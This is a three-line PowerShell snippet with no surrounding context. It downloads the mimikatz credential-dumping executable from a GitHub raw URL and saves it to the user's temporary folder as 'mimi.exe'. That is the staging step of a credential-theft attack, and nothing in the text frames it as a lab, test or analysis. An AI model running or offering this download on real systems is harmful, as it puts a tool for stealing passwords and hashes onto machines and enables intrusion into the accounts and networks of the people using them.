$u = "https://raw.githubusercontent.com/ParrotSec/mimikatz/master/x64/mimikatz.exe"
$f = "$env:TEMP\mimi.exe"
Invoke-WebRequest $u -OutFile $f
